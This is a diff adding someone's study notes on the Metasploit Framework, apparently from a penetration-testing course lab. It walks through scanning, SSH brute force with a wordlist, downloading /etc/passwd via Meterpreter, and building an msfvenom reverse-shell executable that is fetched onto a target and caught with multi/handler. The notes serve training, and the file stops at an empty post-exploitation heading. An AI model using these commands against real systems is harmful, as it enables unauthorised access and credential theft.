@@ -1,0 +1,225 @@
+Metasploit Framework
+
+While using a database is not mandatory to run Metasploit, there are various compelling reasons to do so, such as storing information about target hosts and keeping track of successful exploitation attempts. 
+Metasploit uses PostgreSQL as a database service, which is neither active nor enabled on boot time on Kali.
+
+sudo msfdb init                        -->             Creating and initializing the Metasploit database
+
+sudo systemctl enable postgresql       -->             Enabling the postgresql database service at boot time
+
+sudo msfconsole                        -->             Starting the Metasploit Framework
+
+msf6 > db_status                       -->             Confirming database connectivity
+
+The command-line interface of Metasploit provides numerous commands to navigate and use the framework, divided into categories.
+These categories consist of Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, Credentials Backend Commands, and Developer Commands. 
+
+msf6 > help                            -->             list all the available commands
+
+msf6 > workspace
+msf6 > workspace -a pen200             -->             Creating workspace pen200
+
+msf6 > db_nmap
+msf6 > db_nmap -A 192.168.50.202       -->             Using db_nmap to scan
+
+msf6 > hosts                           -->             Display all discovered hosts
+
+msf6 > services                        -->             Display all discovered services
+msf6 > services -p 445                 -->             Display discovered services on port 445
+
+Modules
+Modules are used to perform tasks in Metasploit such as scanning or exploiting a target. 
+The framework includes several thousand modules, divided into categories.
+
+msf6 > show -h                         -->             Help flag for the show command
+
+To activate a module, we need to enter use with the module name.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Auxiliary Modules
+
+The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more. 
+Auxiliary modules are useful for many tasks, including information gathering (under the gather/ hierarchy), scanning and enumeration of various services (under the scanner/ hierarchy), and so on.
+
+msf6 auxiliary(scanner/portscan/tcp) > show auxiliary                -->           Lists all auxiliary modules
+
+--------------------
+
+msf6 > search type:auxiliary smb                                     -->           Searching for all SMB auxiliary modules in Metasploit
+
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank    Check  Description
+   -  ----                                              ---------------  ----    -----  
+56  auxiliary/scanner/smb/smb_version                                    normal   No     SMB Version Detection
+
+---------------------
+
+To activate a module we can enter use followed by the module name, or use the index provided from search results.
+
+msf6 > use 56                                                         -->         Activate smb_version module
+
+msf6 auxiliary(scanner/smb/smb_version) > info                        -->         Fetches information about the currently activated module
+
+msf6 auxiliary(scanner/smb/smb_version) > show options                -->         Displaying options of the smb_version module
+
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202   -->         Setting the value of the option RHOSTS manually
+
+unset RHOSTS
+services -p 445 --rhosts                                              -->         Setting RHOSTS in an automated fashion via the database results
+
+msf6 auxiliary(scanner/smb/smb_version) > run                         -->         Executing the auxiliary module to detect the SMB version of a target
+
+[*] 192.168.50.202:445    - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) 
+The output shows that the target system supports version 2 and 3 of SMB and prefers SMB 3.1.1
+
+
+Use the vulns command to show if Metasploit automatically detected vulnerabilities based on the results of this module.
+
+msf6 auxiliary(scanner/smb/smb_version) > vulns                        -->         Displaying vulnerabilities identified by Metasploit
+
+
+---------------------
+
+Brute force using Metasploit
+
+msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh    -->         Displaying all SSH auxiliary modules
+
+
+Matching Modules
+================
+
+   #   Name                                                  Disclosure Date  Rank    Check  Description
+   -   ----                                                  ---------------  ----    -----  -----------
+   ...
+   15  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
+
+
+msf6 auxiliary(scanner/smb/smb_version) > use 15
+
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
+msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222                                        -->        Set options of ssh_login
+
+
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+msf6 auxiliary(scanner/ssh/ssh_login) > creds                                                 -->        Displaying all saved credentials of the database
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Using Metasploit Payloads
+
+Staged vs Non-Staged payloads.
+
+A non-staged payload is sent in its entirety along with the exploit. This means the payload contains the exploit and full shellcode for a selected task. 
+In general, these "all-in-one" payloads are more stable. The downside is that the size of these payloads will be bigger than other types.
+
+In contrast, a staged payload is usually sent in two parts. 
+The first part contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.
+
+he "/" character is used to denote whether a payload is staged or not
+
+payload/linux/x64/shell/reverse_tcp       --> staged payload
+
+payload/linux/x64/shell_reverse_tcp       --> non staged payload
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Meterpreter Payload
+
+Metasploit contains the Meterpreter payload, which is a multi-function payload that can be dynamically extended at run-time. 
+The payload resides entirely in memory on the target and its communication is encrypted by default. 
+Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems such as Windows, Linux, macOS, Android, and more.
+
+meterpreter > help                             -->              Display the commands.
+
+meterpreter > sysinfo
+meterpreter > getuid
+
+
+meterpreter > shell                            -->             creates the shell
+
+lpwd
+lcd /home/kali/Downloads
+lpwd
+download /etc/passwd
+lcat /home/kali/Downloads/passwd               -->             Change local directory and download /etc/passwd from the target machine
+
+upload /usr/bin/unix-privesc-check /tmp/       -->             upload the file to targets /tmp/ folder.
+
+meterpreter > exit                             -->             Exits the meter preter.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Executable Payloads
+
+
+Metasploit also provides the functionality to export payloads into various file types and formats such as Windows and Linux binaries, webshells, and more. 
+Metasploit contains msfvenom as a standalone tool to generate these payloads. 
+It provides standardized command line options and includes various techniques to customize payloads.
+
+msfvenom -l payloads --platform windows --arch x64                 -->     lists all the payloads for windows platform with x64 architecture.
+
+
+msfvenom -p payload LHOST=ip LPORT=port -f outputformat -o filename.format
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe    -->    Creating a Windows executable with a non-staged TCP reverse shell payload
+
+iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe                                 -->    Downloads the  non-staged payload binary
+
+Note: Netcat doesn't know how to handle a staged payload and hence we cannot execute any commands through the received reverse shell.
+
+To solve this problem we can use multi/handler module.
+
+Metasploit's multi/handler module, which works for the majority of staged, non-staged, and more advanced payloads. 
+
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+show options
+set LHOST 192.168.119.2
+set LPORT 443
+run                                                                                             -->         Set payload and options for multi/handler and launch it
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Core Meterpreter Post-Exploitation Features
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     
+
+
+
+
+
+
+
+
+
+
+
+
+
+
